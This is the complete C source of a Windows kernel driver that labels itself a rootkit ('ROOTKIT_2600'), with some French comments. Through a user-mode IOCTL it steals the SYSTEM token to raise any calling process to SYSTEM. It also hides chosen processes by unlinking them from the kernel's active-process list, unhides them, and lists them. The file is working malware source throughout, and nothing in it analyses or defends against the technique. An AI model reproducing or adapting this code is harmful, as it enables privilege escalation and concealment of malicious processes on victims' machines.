#include <ntifs.h>
#include <wdm.h>

#define EPROCESS_TOKEN_OFFSET 0x4B8 
#define EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET 0x448 

#define MAX_HIDDEN_PIDS 64 
HANDLE g_HiddenPids[MAX_HIDDEN_PIDS];
ULONG  g_HiddenPidsCount = 0;
KSPIN_LOCK g_HiddenPidsLock; 

typedef enum _ROOTKIT_COMMAND_TYPE
{
    RootkitCommandElevateProcess,
    RootkitCommandHideProcess,
    RootkitCommandUnhideProcess,
    RootkitCommandGetHiddenProcesses 
} ROOTKIT_COMMAND_TYPE;

typedef struct _ROOTKIT_COMMAND_MESSAGE
{
    ROOTKIT_COMMAND_TYPE CommandType;
    HANDLE ProcessId; 
} ROOTKIT_COMMAND_MESSAGE, *PROOTKIT_COMMAND_MESSAGE;

#define IOCTL_ROOTKIT_GENERIC_COMMAND CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

// --- Prototypes ---
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath);
VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject);
NTSTATUS DispatchFunction(PDEVICE_OBJECT DeviceObject, PIRP Irp);
static __forceinline PACCESS_TOKEN GetProcessToken(PEPROCESS Process);
void ElevateProcessByPid(HANDLE pid);
void HideProcessByPid(HANDLE pidToHide);
void UnhideProcessByPid(HANDLE pidToUnhide); 

// --- Implémentations ---
static __forceinline PACCESS_TOKEN GetProcessToken(PEPROCESS Process)
{
    if (!Process)
    {
        return NULL;
    }
    return (PACCESS_TOKEN)(*(PULONG_PTR)((PUCHAR)Process + EPROCESS_TOKEN_OFFSET) & ~0xF);
}

void ElevateProcessByPid(HANDLE pid)
{
    PEPROCESS targetProcess = NULL;
    PEPROCESS systemProcess = NULL;
    NTSTATUS status;

    status = PsLookupProcessByProcessId(pid, &targetProcess);
    if (!NT_SUCCESS(status))
    {
        DbgPrint("[ROOTKIT_2600] ElevateProcess: PsLookupProcessByProcessId for target PID %p failed: 0x%X\n", pid, status);
        return;
    }

    status = PsLookupProcessByProcessId((HANDLE)4, &systemProcess); // PID 4 = SYSTEM
    if (!NT_SUCCESS(status))
    {
        DbgPrint("[ROOTKIT_2600] ElevateProcess: PsLookupProcessByProcessId for SYSTEM failed: 0x%X\n", status);
        if (targetProcess)
        {
            ObDereferenceObject(targetProcess);
        }
        return;
    }

    __try
    {
        PACCESS_TOKEN systemToken = GetProcessToken(systemProcess);
        if (systemToken == NULL)
        {
            DbgPrint("[ROOTKIT_2600] ElevateProcess: Could not get SYSTEM token (NULL).\n");
        } 
        else
        {
            *(PULONG_PTR)((PUCHAR)targetProcess + EPROCESS_TOKEN_OFFSET) = (ULONG_PTR)systemToken;
            DbgPrint("[ROOTKIT_2600] ElevateProcess: Token supposedly elevated for PID %p\n", pid);
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        DbgPrint("[ROOTKIT_2600] ElevateProcess: Exception 0x%X during token copy.\n", GetExceptionCode());
    }

    if (systemProcess)
    {
        ObDereferenceObject(systemProcess);
    }
    if (targetProcess)
    {
        ObDereferenceObject(targetProcess);
    }
}

void HideProcessByPid(HANDLE pidToHide)
{
    PEPROCESS targetEprocess = NULL;
    NTSTATUS status;
    KIRQL oldIrql;
    BOOLEAN found = FALSE;
    ULONG i;

    status = PsLookupProcessByProcessId(pidToHide, &targetEprocess);
    if (!NT_SUCCESS(status) || !targetEprocess)
    {
        DbgPrint("[ROOTKIT_2600] HideProcess: PsLookupProcessByProcessId failed for PID %p, status 0x%X\n", pidToHide, status);
        return;
    }

    DbgPrint("[ROOTKIT_2600] HideProcess: Attempting to hide EPROCESS %p (PID: %p)\n", targetEprocess, pidToHide);
    
    PLIST_ENTRY pListEntry = (PLIST_ENTRY)((PUCHAR)targetEprocess + EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET);
    BOOLEAN unlinkedSuccessfully = FALSE;

    __try
    {
        if (pListEntry->Flink && pListEntry->Blink && 
            pListEntry->Flink->Blink == pListEntry && 
            pListEntry->Blink->Flink == pListEntry) 
        {
            PLIST_ENTRY PrevLinks = pListEntry->Blink;
            PLIST_ENTRY NextLinks = pListEntry->Flink;

            PrevLinks->Flink = NextLinks;
            NextLinks->Blink = PrevLinks;

            pListEntry->Flink = pListEntry; 
            pListEntry->Blink = pListEntry; 
            DbgPrint("[ROOTKIT_2600] HideProcess: Process PID %p unlinked.\n", pidToHide);
            unlinkedSuccessfully = TRUE;
        }
        else
        {
            DbgPrint("[ROOTKIT_2600] HideProcess: ActiveProcessLinks for PID %p inconsistent or already hidden/manipulated.\n", pidToHide);
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        DbgPrint("[ROOTKIT_2600] HideProcess: Exception 0x%X for PID %p.\n", GetExceptionCode(), pidToHide);
    }
    
    if (unlinkedSuccessfully)
    {
        KeAcquireSpinLock(&g_HiddenPidsLock, &oldIrql);
        for (i = 0; i < g_HiddenPidsCount; i++)
        {
            if (g_HiddenPids[i] == pidToHide)
            {
                found = TRUE;
                break;
            }
        }
        if (!found && g_HiddenPidsCount < MAX_HIDDEN_PIDS)
        {
            g_HiddenPids[g_HiddenPidsCount++] = pidToHide;
            DbgPrint("[ROOTKIT_2600] HideProcess: PID %p added to hidden list.\n", pidToHide);
        }
        else if (found)
        {
            DbgPrint("[ROOTKIT_2600] HideProcess: PID %p already in hidden list.\n", pidToHide);
        }
        else
        {
            DbgPrint("[ROOTKIT_2600] HideProcess: Hidden list full, PID %p not added.\n", pidToHide);
        }
        KeReleaseSpinLock(&g_HiddenPidsLock, oldIrql);
    }
    ObDereferenceObject(targetEprocess);
}

void UnhideProcessByPid(HANDLE pidToUnhide)
{
    PEPROCESS targetEprocess = NULL;
    PEPROCESS systemEprocess = NULL; 
    NTSTATUS status;
    KIRQL oldIrql;
    ULONG i, j;

    status = PsLookupProcessByProcessId(pidToUnhide, &targetEprocess);
    if (!NT_SUCCESS(status) || !targetEprocess)
    {
        DbgPrint("[ROOTKIT_2600] UnhideProcess: PsLookupProcessByProcessId for target PID %p failed: 0x%X\n", pidToUnhide, status);
        return;
    }

    status = PsLookupProcessByProcessId((HANDLE)4, &systemEprocess);
    if (!NT_SUCCESS(status) || !systemEprocess)
    {
        DbgPrint("[ROOTKIT_2600] UnhideProcess: PsLookupProcessByProcessId for SYSTEM failed: 0x%X\n", status);
        ObDereferenceObject(targetEprocess);
        return;
    }

    DbgPrint("[ROOTKIT_2600] UnhideProcess: Attempting to unhide EPROCESS %p (PID: %p)\n", targetEprocess, pidToUnhide);
    BOOLEAN relinkedSuccessfully = FALSE;

    __try
    {
        PLIST_ENTRY targetLinks = (PLIST_ENTRY)((PUCHAR)targetEprocess + EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET);
        PLIST_ENTRY systemLinks = (PLIST_ENTRY)((PUCHAR)systemEprocess + EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET);

        if (targetLinks->Flink == targetLinks && targetLinks->Blink == targetLinks)
        { 
            PLIST_ENTRY nextAfterSystem = systemLinks->Flink;

            targetLinks->Flink = nextAfterSystem;       
            targetLinks->Blink = systemLinks;       
            
            if (nextAfterSystem && nextAfterSystem != systemLinks) 
            {
                 nextAfterSystem->Blink = targetLinks;   
            }
            // else if (nextAfterSystem == systemLinks) { ... } // Logique spécifique si besoin

            systemLinks->Flink = targetLinks;          
            DbgPrint("[ROOTKIT_2600] UnhideProcess: Process PID %p re-linked after SYSTEM.\n", pidToUnhide);
            relinkedSuccessfully = TRUE;
        }
        else
        {
            DbgPrint("[ROOTKIT_2600] UnhideProcess: Target PID %p not in expected 'hidden' state.\n", pidToUnhide);
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        DbgPrint("[ROOTKIT_2600] UnhideProcess: Exception 0x%X for PID %p.\n", GetExceptionCode(), pidToUnhide);
    }

    if (relinkedSuccessfully)
    {
        KeAcquireSpinLock(&g_HiddenPidsLock, &oldIrql);
        for (i = 0; i < g_HiddenPidsCount; i++)
        {
            if (g_HiddenPids[i] == pidToUnhide)
            {
                for (j = i; j < g_HiddenPidsCount - 1; j++)
                {
                    g_HiddenPids[j] = g_HiddenPids[j + 1];
                }
                if (g_HiddenPidsCount > 0)
                {
                    g_HiddenPidsCount--; 
                }
                DbgPrint("[ROOTKIT_2600] UnhideProcess: PID %p removed from hidden list.\n", pidToUnhide);
                break;
            }
        }
        KeReleaseSpinLock(&g_HiddenPidsLock, oldIrql);
    }

    if (systemEprocess)
    {
        ObDereferenceObject(systemEprocess);
    }
    if (targetEprocess)
    {
        ObDereferenceObject(targetEprocess);
    }
}

NTSTATUS DispatchFunction(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    PIO_STACK_LOCATION stackLocation = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_SUCCESS;
    PROOTKIT_COMMAND_MESSAGE commandMessage = NULL;
    ULONG inputBufferLength = 0;
    ULONG outputBufferLength = 0;

    switch (stackLocation->MajorFunction)
    {
    case IRP_MJ_CREATE:
        DbgPrint("[ROOTKIT_2600] IRP_MJ_CREATE\n");
        status = STATUS_SUCCESS;
        break;
    case IRP_MJ_CLOSE:
        DbgPrint("[ROOTKIT_2600] IRP_MJ_CLOSE\n");
        status = STATUS_SUCCESS;
        break;
    case IRP_MJ_DEVICE_CONTROL:
    {
        DbgPrint("[ROOTKIT_2600] IRP_MJ_DEVICE_CONTROL. IOCTL: 0x%X\n", stackLocation->Parameters.DeviceIoControl.IoControlCode);
        if (stackLocation->Parameters.DeviceIoControl.IoControlCode == IOCTL_ROOTKIT_GENERIC_COMMAND)
        {
            inputBufferLength = stackLocation->Parameters.DeviceIoControl.InputBufferLength;
            outputBufferLength = stackLocation->Parameters.DeviceIoControl.OutputBufferLength; 
            commandMessage = (PROOTKIT_COMMAND_MESSAGE)Irp->AssociatedIrp.SystemBuffer;

            if (inputBufferLength >= sizeof(ROOTKIT_COMMAND_MESSAGE) && commandMessage != NULL)
            {
                switch (commandMessage->CommandType)
                {
                    case RootkitCommandElevateProcess:
                        DbgPrint("[ROOTKIT_2600] Command: ElevateProcess for caller.\n");
                        ElevateProcessByPid(PsGetCurrentProcessId());
                        status = STATUS_SUCCESS;
                        Irp->IoStatus.Information = 0; 
                        break;
                    case RootkitCommandHideProcess:
                        DbgPrint("[ROOTKIT_2600] Command: HideProcess for PID %p.\n", commandMessage->ProcessId);
                        if (commandMessage->ProcessId > (HANDLE)0)
                        {
                            HideProcessByPid(commandMessage->ProcessId);
                            status = STATUS_SUCCESS;
                        } 
                        else
                        {
                            DbgPrint("[ROOTKIT_2600] HideProcess: Invalid PID.\n");
                            status = STATUS_INVALID_PARAMETER;
                        }
                        Irp->IoStatus.Information = 0;
                        break;
                    case RootkitCommandUnhideProcess: 
                        DbgPrint("[ROOTKIT_2600] Command: UnhideProcess for PID %p.\n", commandMessage->ProcessId);
                        if (commandMessage->ProcessId > (HANDLE)0)
                        {
                            UnhideProcessByPid(commandMessage->ProcessId);
                            status = STATUS_SUCCESS;
                        } 
                        else
                        {
                            DbgPrint("[ROOTKIT_2600] UnhideProcess: Invalid PID.\n");
                            status = STATUS_INVALID_PARAMETER;
                        }
                        Irp->IoStatus.Information = 0;
                        break;
                    case RootkitCommandGetHiddenProcesses:
                    {
                        DbgPrint("[ROOTKIT_2600] Command: GetHiddenProcesses.\n");
                        KIRQL oldIrqlList;
                        PEPROCESS tempEprocess;
                        NTSTATUS lookupStatus;
                        HANDLE validPids[MAX_HIDDEN_PIDS];
                        ULONG validPidsCount = 0;
                        
                        KeAcquireSpinLock(&g_HiddenPidsLock, &oldIrqlList);
                        DbgPrint("[ROOTKIT_2600] GetHiddenProcesses: Current hidden PIDs count: %lu\n", g_HiddenPidsCount);
                        for (ULONG i = 0; i < g_HiddenPidsCount; i++)
                        {
                            if (g_HiddenPids[i] == NULL || g_HiddenPids[i] == (HANDLE)0 || g_HiddenPids[i] == (HANDLE)-1)
                            {
                                continue;
                            }
                            lookupStatus = PsLookupProcessByProcessId(g_HiddenPids[i], &tempEprocess);
                            if (NT_SUCCESS(lookupStatus))
                            {
                                if (validPidsCount < MAX_HIDDEN_PIDS)
                                {
                                    validPids[validPidsCount++] = g_HiddenPids[i];
                                }
                                ObDereferenceObject(tempEprocess); 
                            }
                            else
                            {
                                DbgPrint("[ROOTKIT_2600] GetHiddenProcesses: Stale PID %p (lookup status 0x%X) removed from list.\n", g_HiddenPids[i], lookupStatus);
                            }
                        }
                        
                        g_HiddenPidsCount = 0; 
                        if (validPidsCount > 0)
                        {
                            RtlCopyMemory(g_HiddenPids, validPids, validPidsCount * sizeof(HANDLE));
                            g_HiddenPidsCount = validPidsCount;
                        }
                        
                        ULONG bytesToWrite = g_HiddenPidsCount * sizeof(HANDLE);
                        if (outputBufferLength >= bytesToWrite)
                        {
                            if (g_HiddenPidsCount > 0 && Irp->AssociatedIrp.SystemBuffer != NULL)
                            {
                                RtlCopyMemory(Irp->AssociatedIrp.SystemBuffer, g_HiddenPids, bytesToWrite);
                                Irp->IoStatus.Information = bytesToWrite; 
                                DbgPrint("[ROOTKIT_2600] GetHiddenProcesses: Copied %lu valid PIDs (%lu bytes).\n", g_HiddenPidsCount, bytesToWrite);
                            }
                            else
                            {
                                Irp->IoStatus.Information = 0;
                                DbgPrint("[ROOTKIT_2600] GetHiddenProcesses: No PIDs to copy or SystemBuffer is NULL.\n");
                            }
                            status = STATUS_SUCCESS;
                        }
                        else
                        {
                            Irp->IoStatus.Information = 0;
                            status = STATUS_BUFFER_TOO_SMALL;
                            DbgPrint("[ROOTKIT_2600] GetHiddenProcesses: Output buffer too small. Needed %lu, provided %lu.\n", bytesToWrite, outputBufferLength);
                        }
                        KeReleaseSpinLock(&g_HiddenPidsLock, oldIrqlList);
                        break;
                    }
                    default:
                        DbgPrint("[ROOTKIT_2600] Unknown command type: %d\n", commandMessage->CommandType);
                        status = STATUS_INVALID_DEVICE_REQUEST;
                        Irp->IoStatus.Information = 0;
                        break;
                }
            }
            else
            {
                DbgPrint("[ROOTKIT_2600] Invalid buffer for command.\n");
                status = STATUS_INVALID_PARAMETER;
                Irp->IoStatus.Information = 0;
            }
        }
        else
        {
            DbgPrint("[ROOTKIT_2600] Unknown IOCTL: 0x%X\n", stackLocation->Parameters.DeviceIoControl.IoControlCode);
            status = STATUS_INVALID_DEVICE_REQUEST;
            Irp->IoStatus.Information = 0;
        }
        break;
    } // Fin du case IRP_MJ_DEVICE_CONTROL
    default:
        DbgPrint("[ROOTKIT_2600] Unknown IRP_MJ_*: 0x%X\n", stackLocation->MajorFunction);
        status = STATUS_NOT_SUPPORTED;
        Irp->IoStatus.Information = 0;
        break;
    } // Fin du switch (stackLocation->MajorFunction)

    Irp->IoStatus.Status = status; 
    // Irp->IoStatus.Information est déjà défini dans chaque cas.
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
    UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\MonDeviceLink");
    DbgPrint("[ROOTKIT_2600] Driver Unloading...\n");
    IoDeleteSymbolicLink(&symLink);
    if (DriverObject->DeviceObject != NULL)
    {
        IoDeleteDevice(DriverObject->DeviceObject);
    }
    DbgPrint("[ROOTKIT_2600] Driver Unloaded.\n");
}

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);
    NTSTATUS status;
    UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\MonDevice");
    UNICODE_STRING deviceLink = RTL_CONSTANT_STRING(L"\\??\\MonDeviceLink");
    PDEVICE_OBJECT deviceObject = NULL;

    DbgPrint("[ROOTKIT_2600] Driver Loading...\n");

    KeInitializeSpinLock(&g_HiddenPidsLock);
    RtlZeroMemory(g_HiddenPids, sizeof(g_HiddenPids));
    g_HiddenPidsCount = 0;

    status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN,
                            FILE_DEVICE_SECURE_OPEN, FALSE, &deviceObject);
    if (!NT_SUCCESS(status))
    {
        DbgPrint("[ROOTKIT_2600] DriverEntry: IoCreateDevice failed: 0x%X\n", status);
        return status;
    }

    status = IoCreateSymbolicLink(&deviceLink, &deviceName);
    if (!NT_SUCCESS(status))
    {
        DbgPrint("[ROOTKIT_2600] DriverEntry: IoCreateSymbolicLink failed: 0x%X\n", status);
        IoDeleteDevice(deviceObject);
        return status;
    }

    DriverObject->MajorFunction[IRP_MJ_CREATE] = DispatchFunction;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = DispatchFunction;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchFunction;
    DriverObject->DriverUnload = DriverUnload;

    DbgPrint("[ROOTKIT_2600] Driver Loaded Successfully.\n");
    return STATUS_SUCCESS;
}